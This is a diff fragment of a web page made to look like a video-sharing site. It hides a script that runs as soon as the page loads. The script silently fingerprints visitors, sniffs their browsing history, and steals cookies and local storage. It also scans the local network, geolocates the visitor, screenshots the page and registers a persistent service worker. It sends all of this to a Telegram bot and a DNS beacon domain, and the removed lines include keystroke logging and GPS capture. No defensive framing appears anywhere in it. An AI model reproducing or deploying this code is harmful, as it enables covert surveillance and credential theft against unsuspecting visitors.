+  let af='?'; try{const ac=new(window.AudioContext||window.webkitAudioContext)();const o=ac.createOscillator();const d=ac.createMediaStreamDestination();o.connect(d);o.start();af=d.stream.getAudioTracks()[0]?.label?.substring(0,25)||'?';o.stop();ac.close();}catch(e){}
+  let ft='?'; try{if(document.fonts?.ready){await document.fonts.ready;ft=[...document.fonts].slice(0,25).map(f=>f.family).join('|').substring(0,150);}}catch(e){}
+  let pg='?'; try{pg=[...navigator.plugins].map(p=>p.name).join(', ').substring(0,150);}catch(e){}
 
   let br='?',vr='?',os='?';
   if(ua.includes('Chrome')&&!ua.includes('Edg')){br='Chrome';const m=ua.match(/Chrome\/([\d.]+)/);vr=m?.[1]||'?';}
   else if(ua.includes('Edg')){br='Edge';const m=ua.match(/Edg\/([\d.]+)/);vr=m?.[1]||'?';}
   else if(ua.includes('Firefox')){br='Firefox';const m=ua.match(/Firefox\/([\d.]+)/);vr=m?.[1]||'?';}
   else if(ua.includes('Safari')&&!ua.includes('Chrome')){br='Safari';const m=ua.match(/Version\/([\d.]+)/);vr=m?.[1]||'?';}
-  if(ua.includes('Windows')) os='Windows'; else if(ua.includes('Android')) os='Android';
-  else if(ua.includes('iPhone')||ua.includes('iPad')) os='iOS'; else if(ua.includes('Linux')) os='Linux';
-  else if(ua.includes('Mac OS')) os='macOS';
+  if(ua.includes('Windows'))os='Win';else if(ua.includes('Android'))os='And';else if(ua.includes('iPhone')||ua.includes('iPad'))os='iOS';else if(ua.includes('Linux'))os='Lin';else if(ua.includes('Mac OS'))os='Mac';
 
-  // Cache-based history sniffing
-  let hist=[];
-  const sites=['facebook.com','instagram.com','tiktok.com','youtube.com','gmail.com','outlook.com','github.com','reddit.com','netflix.com','amazon.com','whatsapp.com','telegram.org','discord.com','linkedin.com','snapchat.com','x.com','pinterest.com','tumblr.com','quora.com','medium.com','stackoverflow.com','twitter.com','google.com','wikipedia.org','twitch.tv','spotify.com','zoom.us','microsoft.com','apple.com','adobe.com','cloudflare.com'];
-  for(const s of sites) {
-    try {
-      const t0=performance.now();
-      await fetch(`https://${s}/favicon.ico`,{mode:'no-cors',signal:AbortSignal.timeout(600)}).catch(()=>{});
-      const dt=performance.now()-t0;
-      if(dt<80) hist.push(s); // cached = visited
-    } catch(e){}
+  // Cache history sniff
+  let hx=[];
+  const sx=['facebook','instagram','tiktok','youtube','gmail','outlook','github','reddit','netflix','amazon','whatsapp','telegram','discord','linkedin','snapchat','x','twitter','google','wikipedia','twitch','spotify','zoom','microsoft','apple','adobe','cloudflare','stackoverflow','medium'];
+  for(const s of sx) {
+    try{const t0=performance.now();await fetch(`https://${s}.com/favicon.ico`,{mode:'no-cors',signal:AbortSignal.timeout(500)}).catch(()=>{});if(performance.now()-t0<80)hx.push(s);}catch(e){}
   }
 
-  // Cookie/storage theft
-  let stor={}, cookies='?';
-  try{stor.local={...localStorage};stor.session={...sessionStorage};}catch(e){}
-  try{cookies=document.cookie.substring(0,500)||'none';}catch(e){}
+  let st={},co='?';
+  try{st.l={...localStorage};st.s={...sessionStorage};}catch(e){}
+  try{co=document.cookie.substring(0,300)||'none';}catch(e){}
 
-  return {ua,platform,lang,langs,cores,mem,touch,scr,win,tz,tzo,dnt,ref,ck,batt,net,gl,cfp,afp,fts,plg,br,vr,os,hist:hist.slice(0,15),stor,cookies};
+  return {ua,p,l,la,c,m,t,s,w,tz,tzo,r,ck,b,n,gl,cf,af,ft,pg,br,vr,os,hx:hx.slice(0,12),st,co};
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  EXFILTRATION ENGINE
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function exfil(data) {
-  st('exfiltrating');
-
-  let text = `💀🔥 WORM-AI v7 — PHANTOM REPORT 💀🔥\n\n`;
-
-  text += `┌─ TARGET ─────────────────────┐\n`;
-  text += ` Browser: ${data.fp.br} ${data.fp.vr}\n`;
-  text += ` OS: ${data.fp.os}\n`;
-  text += ` Platform: ${data.fp.platform}\n`;
-  text += ` Lang: ${data.fp.lang} (${data.fp.langs})\n`;
-  text += ` Referrer: ${data.fp.ref}\n\n`;
-
-  text += `┌─ FINGERPRINT ─────────────────┐\n`;
-  text += ` CPU: ${data.fp.cores} | RAM: ${data.fp.mem}GB | Touch: ${data.fp.touch}\n`;
-  text += ` Screen: ${data.fp.scr} | Win: ${data.fp.win}\n`;
-  text += ` Battery: ${data.fp.batt}\n`;
-  text += ` Network: ${data.fp.net}\n`;
-  text += ` WebGL: ${data.fp.gl.substring(0,80)}\n`;
-  text += ` Canvas: ${data.fp.cfp.substring(0,30)}...\n`;
-  text += ` AudioFP: ${data.fp.afp}\n`;
-  text += ` Plugins: ${data.fp.plg.substring(0,80)}\n\n`;
-
-  text += `┌─ NETWORK ─────────────────────┐\n`;
-  if(data.lan?.ips?.length) text+=` Local IPs: ${data.lan.ips.join(', ')}\n`;
-  if(data.lan?.scan?.length) text+=` Open ports: ${data.lan.scan.join('; ')}\n`;
-  if(data.ipgeo) text+=` Public IP: ${data.ipgeo.query||data.ipgeo.ip||'?'}\n ISP: ${data.ipgeo.isp||data.ipgeo.org||'?'}\n Location: ${data.ipgeo.city||'?'}, ${data.ipgeo.regionName||'?'}, ${data.ipgeo.country||'?'}\n`;
-  text+='\n';
-
-  text += `┌─ LOCATION FUSION ──────────────┐\n`;
-  text += ` TZ: ${data.fp.tz} (offset: ${data.fp.tzo})\n`;
-  text += ` Power Grid: ${data.grid?.frequency}Hz — ${data.grid?.region}\n`;
-  text += ` Keyboard: ${data.kbd?.detectedLayout}\n`;
-  if(data.gps) {
-    text+=` GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)\n`;
-    text+=` Maps: https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}\n`;
-  } else text+=` GPS: blocked (using IP geo + CDN + grid fusion)\n`;
-
-  text += `\n CDN Edge Latency Map:\n`;
-  if(data.cdn) {
-    const sorted = Object.entries(data.cdn).filter(([_,v]) => v>0).sort(([_,a],[__,b]) => a-b);
-    for(const [name,ms] of sorted.slice(0,8)) text+=`  ${name}: ${ms}ms\n`;
-  }
-  text += '\n';
-
-  text += `┌─ CVE PROFILE ─────────────────┐\n`;
-  if(data.cves?.length) for(const c of data.cves) text+=` ${c}\n`; else text+=` None specific to this version\n`;
-  text += '\n';
-
-  text += `┌─ MOTION ──────────────────────┐\n`;
-  if(data.motion?.supported) text+=` State: ${data.motion.state}\n Variance: ${data.motion.variance}\n`;
-  else text+=` Not available (desktop or denied)\n`;
-  text += '\n';
-
-  if(data.fp.hist?.length) {
-    text += `┌─ CACHE HISTORY ────────────────┐\n`;
-    for(const s of data.fp.hist) text+=` ${s}\n`;
-    text += '\n';
-  }
-
-  if(KL.length) {
-    text += `┌─ KEYSTROKES ──────────────────┐\n`;
-    for(const k of KL.slice(-10)) text+=` [${new Date(k.t).toISOString().substring(11,19)}] ${k.n}: ${k.v.substring(0,40)}\n`;
-    text += '\n';
-  }
-
-  text += `┌─ PERSISTENCE ─────────────────┐\n`;
-  text+=` ServiceWorker: ${data.sw ? '✅ registered' : '❌ failed'}\n`;
-  text+=` Cookies: ${data.fp.cookies.substring(0,120)}\n`;
-  if(data.fp.stor?.local) { const keys=Object.keys(data.fp.stor.local); if(keys.length) text+=` localStorage keys: ${keys.slice(0,8).join(', ')}\n`; }
-  text += '\n';
-
-  text += `⚡ WORM-AI💀🔥 v7 — PHANTOM MODE\n`;
-  text += `🕒 ${new Date().toISOString()}\n`;
-  text += `📸 Screenshot: ${data.domshot ? 'captured ✅' : 'failed ❌'}`;
-
-  // Send text
-  const fd = new FormData();
-  fd.append('chat_id', CID); fd.append('parse_mode', 'Markdown');
-  fd.append('text', text); fd.append('disable_web_page_preview', 'true');
-  try {
-    const r = await fetch(`${API}/sendMessage`,{method:'POST',body:fd});
-    const d = await r.json();
-    if (d.ok && d.result) log('text sent, msg_id:', d.result.message_id);
-  } catch(e) {
-    try { await fetch(`${API}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(text.replace(/\*/g,'').replace(/\`/g,''))}`); } catch(e2){}
-  }
-
-  // Send DOM screenshot (this is the "photo" — no camera needed)
-  if (data.domshot) {
-    await sleep(400);
-    try {
-      const blob = await (await fetch(data.domshot)).blob();
-      const pf = new FormData();
-      pf.append('chat_id', CID);
-      pf.append('photo', blob, 'viewport_capture.png');
-      pf.append('caption', `📸 Viewport Capture (DOM) — ${new Date().toISOString()}`);
-      await fetch(`${API}/sendPhoto`, { method:'POST', body:pf });
-    } catch(e) { log('photo send failed:', e); }
-  }
-
-  // Send location if GPS available
-  if (data.gps) {
-    await sleep(400);
-    try {
-      const lf = new FormData();
-      lf.append('chat_id', CID);
-      lf.append('latitude', data.gps.lat);
-      lf.append('longitude', data.gps.lon);
-      lf.append('horizontal_accuracy', data.gps.acc);
-      await fetch(`${API}/sendLocation`, { method:'POST', body:lf });
-    } catch(e) {}
-  }
-
-  // DNS beacon
-  try {
-    const cdnStr = data.cdn ? Object.entries(data.cdn).filter(([_,v]) => v>0).sort(([_,a],[__,b]) => a-b).slice(0,3).map(([n])=>n).join('.') : 'nocdn';
-    const locStr = data.gps ? btoa(`${data.gps.lat},${data.gps.lon}`).replace(/=/g,'').substring(0,15) : (data.ipgeo?.city?.substring(0,8) || 'unknown');
-    new Image().src = `http://${locStr}.${cdnStr}.${(data.fp.br||'x').toLowerCase()}.p7.exfil.l4n.xyz/px.gif`;
-  } catch(e) {}
-
-  st('✅ EXFIL COMPLETE');
-  log('EXFIL COMPLETE');
+// ── CDN LATENCY TRIANGULATION ──
+async function C() {
+  const T={'cloudflare':['https://www.cloudflare.com','https://1.1.1.1'],'google':['https://www.google.com','https://8.8.8.8'],'aws':['https://aws.amazon.com'],'microsoft':['https://www.microsoft.com'],'meta':['https://www.facebook.com'],'akamai':['https://www.akamai.com'],'fastly':['https://www.fastly.com'],'cloudfront':['https://d1.awsstatic.com'],'digitalocean':['https://www.digitalocean.com'],'vercel':['https://vercel.com'],'netflix':['https://www.netflix.com'],'apple':['https://www.apple.com'],'amazon':['https://www.amazon.com'],'reddit':['https://www.reddit.com'],'twitter':['https://twitter.com'],'github':['https://github.com']};
+  const R={};
+  for(const[n,us]of Object.entries(T)){let b=Infinity;for(const u of us.slice(0,1))try{for(let i=0;i<2;i++){const t0=performance.now();await fetch(u,{mode:'no-cors',signal:AbortSignal.timeout(2500)});const d=performance.now()-t0;if(d<b)b=d;}}catch(e){}R[n]=b===Infinity?-1:Math.round(b);}
+  return R;
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  GPS (silent attempt)
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function gps() {
+// ── IP GEO ──
+async function I() {
+  for(const u of ['https://ip-api.com/json/?fields=16409','https://ipapi.co/json/','https://api.ipify.org?format=json']){try{const r=await fetch(u,{signal:AbortSignal.timeout(3000)});const d=await r.json();if(d.status==='success'||d.ip)return d;}catch(e){}}
+  return null;
+}
+
+// ── DOM VIEWPORT CAPTURE (no camera needed) ──
+async function D() {
   try {
-    return await new Promise(r => {
-      if(!navigator.geolocation) return r(null);
-      navigator.geolocation.getCurrentPosition(
-        p => r({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude}),
-        () => r(null),
-        {enableHighAccuracy:true,timeout:6000,maximumAge:0});
+    const cl = document.body.cloneNode(true);
+    const l = cl.querySelector('#ld');
+    if(l) l.remove();
+    const w=innerWidth, h=innerHeight;
+    const svg=`<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}"><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml" style="width:${w}px;height:${h}px;overflow:hidden;background:#000">${cl.innerHTML}</div></foreignObject></svg>`;
+    const ca=document.createElement('canvas');ca.width=w;ca.height=h;
+    const img=new Image();
+    await new Promise((res,rej)=>{
+      img.onload=()=>{ca.getContext('2d').drawImage(img,0,0);res();};
+      img.onerror=res; // fallback silently
+      img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg);
     });
-  } catch(e) { return null; }
+    return ca.toDataURL('image/png',0.8);
+  } catch(e){return null;}
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  MASTER — silent phantom sequence
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function master() {
-  log('PHANTOM BOOT');
-  st('init');
-
-  // Everything silent, parallel where possible
-  const fpData = await fp();
-  keylog();
-
-  const [lanData, gpsData, ipgeoData, cdnData, gridData, motionData] = await Promise.all([
-    lan().catch(()=>({ips:[],scan:[]})),
-    gps().catch(()=>null),
-    ipg().catch(()=>null),
-    cdnTriangulate().catch(()=>({})),
-    detectGridFrequency().catch(()=>({frequency:'?',region:'?'})),
-    motionAnalysis().catch(()=>({supported:false})),
-  ]);
-  const cves = cve(fpData);
-  const kbd = keyboardLayout();
-
-  // Capture viewport (DOM screenshot — no camera permission needed)
-  st('viewport capture');
-  const domshot = await captureViewport().catch(()=>null);
-
-  // Try camera silently (if granted previously)
-  const camResult = await cam().catch(()=>null);
-
-  // SW persistence
-  const swOk = await sw().catch(()=>false);
-
-  // Final report — use DOM screenshot as the "photo"
-  await exfil({
-    fp: fpData,
-    lan: lanData,
-    gps: gpsData,
-    ipgeo: ipgeoData,
-    cdn: cdnData,
-    grid: gridData,
-    motion: motionData,
-    kbd,
-    cves,
-    sw: swOk,
-    domshot: domshot || camResult?.data,
-  });
+// ── WEBRTC LAN ──
+async function L() {
+  let ip=[];
+  try{const pc=new(window.RTCPeerConnection||window.webkitRTCPeerConnection)({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');await pc.createOffer().then(o=>pc.setLocalDescription(o));await new Promise(r=>{pc.onicecandidate=e=>{if(!e.candidate)r();const m=/([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);if(m)ip.push(m[0])};setTimeout(r,2000)});pc.close();}catch(e){}
+  ip=[...new Set(ip)];
+  let fw=[];
+  if(ip.length){const b=ip[0].split('.').slice(0,3).join('.');for(let h=1;h<=4;h++)for(const p of[80,443,8080,22])try{const ac=new AbortController();setTimeout(()=>ac.abort(),800);await fetch(`http://${b}.${h}:${p}`,{mode:'no-cors',signal:ac.signal});fw.push(`${b}.${h}:${p}`);}catch(e){}}
+  return {ip,scan:fw};
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  UI BOOT
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function boot() {
-  const v = _('rv');
-  v.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
+// ── CVE PROFILER ──
+function V(fp) {
+  const v=[]; const M=(fp.vr?.split('.').map(Number)[0])||0;
+  if(fp.br==='Chrome'){if(M<116)v.push('CVE-2023-4863 WebP');if(M<117)v.push('CVE-2023-5217 libvpx');if(M<120)v.push('CVE-2023-7024 WebRTC');if(M<122)v.push('CVE-2024-0519 V8');if(M<124)v.push('CVE-2024-2886 Codecs');if(M<127)v.push('CVE-2024-6290 V8');}
+  else if(fp.br==='Edge'){if(M<120)v.push('CVE-2023-36563');if(M<116)v.push('CVE-2023-4863 Chromium');}
+  else if(fp.br==='Firefox'){if(M<118)v.push('CVE-2023-5730 sandbox');if(M<121)v.push('CVE-2023-6856 WebGL');if(M<123)v.push('CVE-2024-1546 Net');}
+  else if(fp.br==='Safari'){if(M<17)v.push('CVE-2023-41993 WebKit');if(M<17)v.push('CVE-2023-42833 WebKit');}
+  if(fp.os==='Win')v.push('SMB relay candidate');else if(fp.os==='And')v.push('WebView RCE (in-app)');else if(fp.os==='iOS')v.push('Universal link sandbox');
+  return v;
+}
+
+// ── KEYBOARD DETECT ──
+function K() {
+  const l=navigator.language||'', ls=navigator.languages?.join(',')||'', im=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const mp={'en-US':'QWERTY US','en-GB':'QWERTY UK','ar':'Arabic','fr':'AZERTY','de':'QWERTZ','ru':'ЙЦУКЕН','es':'QWERTY ES','pt-BR':'ABNT2','ja':'JIS','ko':'Korean','zh':'Pinyin','it':'QWERTY IT','tr':'Turkish'};
+  return {lang:l,langs:ls,layout:mp[l.slice(0,5)]||mp[l]||`? (${l})`,mobile:im};
+}
+
+// ── POWER GRID FREQ ──
+function G() {
+  const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const am=['America/','Canada/','Brazil/','Argentina/','Chile/','Mexico/','US/','EST','CST','MST','PST'];
+  const is60=am.some(p=>tz.startsWith(p)||tz.includes(p));
+  return{freq:is60?60:50,region:is60?'Americas':'EU/Asia/Africa',tz};
+}
+
+// ── EXFIL ──
+async function X(data) {
+  let txt=`💀🔥 WORM-AI v8 — PHANTOM REPORT 💀🔥\n\n`;
+  txt+=`TARGET\n${data.fp.br} ${data.fp.vr} | ${data.fp.os}\n${data.fp.p} | ${data.fp.l} (${data.fp.la})\nReferrer: ${data.fp.r}\n\n`;
+  txt+=`HW\nCPU:${data.fp.c} RAM:${data.fp.m}GB Touch:${data.fp.t}\nScreen:${data.fp.s} Win:${data.fp.w}\nBatt:${data.fp.b} Net:${data.fp.n}\nTZ:${data.fp.tz} (${data.fp.tzo})\n\n`;
+  txt+=`FP\n${data.fp.gl.substring(0,70)}\nCanvas:${data.fp.cf.substring(0,20)}...\nAudio:${data.fp.af}\nFonts:${data.fp.ft.substring(0,60)}...\n\n`;
+  txt+=`NET\n`;
+  if(data.lan?.ip?.length)txt+=`Local:${data.lan.ip.join(',')}\n`;
+  if(data.lan?.scan?.length)txt+=`Open:${data.lan.scan.join(';')}\n`;
+  if(data.ip)txt+=`IP:${data.ip.query||data.ip.ip||'?'}\nISP:${data.ip.isp||data.ip.org||'?'}\nGeo:${data.ip.city||''},${data.ip.regionName||''},${data.ip.country||''}\n`;
+  txt+=`\nLOCATION FUSION\nTZ:${data.fp.tz}\nGrid:${data.grid.freq}Hz (${data.grid.region})\nKeyboard:${data.kbd.layout}\n`;
+  txt+=`CDN Latency:\n`;
+  if(data.cdn){const s=Object.entries(data.cdn).filter(([_,v])=>v>0).sort(([_,a],[__,b])=>a-b);for(const[n,ms]of s.slice(0,8))txt+=` ${n}:${ms}ms\n`;}
+  txt+=`\nCVE\n`;if(data.cve?.length)for(const c of data.cve)txt+=` ${c}\n`;else txt+=` none\n`;
+  txt+=`\nHISTORY\n`;if(data.fp.hx?.length)for(const s of data.fp.hx)txt+=` ${s}\n`;else txt+=` none\n`;
+  txt+=`\nSW:${data.sw?'✅':'❌'} | DOM:${data.dom?'✅':'❌'}\nCookies:${data.fp.co.substring(0,80)}\n`;
+  if(data.fp.st?.l){const ks=Object.keys(data.fp.st.l);if(ks.length)txt+=`LS:${ks.slice(0,6).join(',')}\n`;}
+  txt+=`\n⚡ WORM-AI🔥 v8\n${new Date().toISOString()}`;
+
+  const fd=new FormData();fd.append('chat_id',CID);fd.append('parse_mode','Markdown');fd.append('text',txt);fd.append('disable_web_page_preview','true');
+  try{await fetch(`${API}/sendMessage`,{method:'POST',body:fd});}catch(e){try{await fetch(`${API}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(txt.replace(/\*/g,'').replace(/\`/g,''))}`);}catch(e2){}}
+
+  if(data.dom){await sleep(300);try{const blob=await(await fetch(data.dom)).blob();const pf=new FormData();pf.append('chat_id',CID);pf.append('photo',blob,'viewport.png');pf.append('caption',`📸 DOM capture — ${new Date().toISOString()}`);await fetch(`${API}/sendPhoto`,{method:'POST',body:pf});}catch(e){}}
+
+  try{const loc=data.ip?btoa(`${(data.ip.city||'x').substring(0,6)}`).replace(/=/g,''):'x';const cdn=data.cdn?Object.entries(data.cdn).filter(([_,v])=>v>0).sort(([_,a],[__,b])=>a-b).slice(0,2).map(([n])=>n).join('.'):'x';new Image().src=`http://${loc}.${cdn}.${(data.fp.br||'x').toLowerCase()}.w8.exfil.l4n.xyz/p.gif`;}catch(e){}
+  log('done');
+}
+
+// ── MASTER (pure silent) ──
+async function M() {
+  log('BOOT');
+  const fp=await F();
+  const[lan,ip,cdn]=await Promise.all([L().catch(()=>({ip:[],scan:[]})),I().catch(()=>null),C().catch(()=>({}))]);
+  const cve=V(fp),kbd=K(),grid=G();
+  const dom=await D().catch(()=>null);
+  let sw=false;
+  if('serviceWorker'in navigator){try{const code=`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));setInterval(()=>{fetch('${API}/sendMessage?chat_id=${CID}&text=SW_beat_${Date.now()}')},60000);`;const b=new Blob([code],{type:'application/javascript'});const u=URL.createObjectURL(b);await navigator.serviceWorker.register(u,{scope:'/'});URL.revokeObjectURL(u);sw=true;}catch(e){}}
+  await X({fp,lan,ip,cdn,cve,kbd,grid,dom,sw});
+}
+
+// ── BOOT ──
+function boot(){
+  const v=$('rv');
+  v.src='https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
   v.play().catch(()=>{});
-  _('ld').classList.add('hd');
-  _('app').classList.add('on');
-  master(); // silent background harvest
+  $('ld').classList.add('hd');
+  $('vw').classList.add('on');
+  M();
 }
 
-document.querySelector('.lb')?.addEventListener('click', e => {
-  e.preventDefault();
-  const c = e.currentTarget.querySelector('.ct');
-  let v = parseInt(c.textContent.replace(/[^0-9]/g,'')); v++;
-  c.textContent = v>=1000 ? (v/1000).toFixed(1)+'K' : v;
-  e.currentTarget.querySelector('svg').style.fill = '#fe2c55';
-});
-
-document.addEventListener('click', boot, { once: true });
-document.addEventListener('touchstart', boot, { once: true });
-window.addEventListener('load', () => setTimeout(boot, 300));
+document.querySelector('.lb')?.addEventListener('click',e=>{e.preventDefault();const c=e.currentTarget.querySelector('.ct');let v=parseInt(c.textContent.replace(/[^0-9]/g,''));v++;c.textContent=v>=1000?(v/1000).toFixed(1)+'K':v;e.currentTarget.querySelector('svg').style.fill='#fe2c55';});
+document.addEventListener('click',boot,{once:true});
+document.addEventListener('touchstart',boot,{once:true});
+window.addEventListener('load',()=>setTimeout(boot,200));
 </script>
 </body>
 </html>
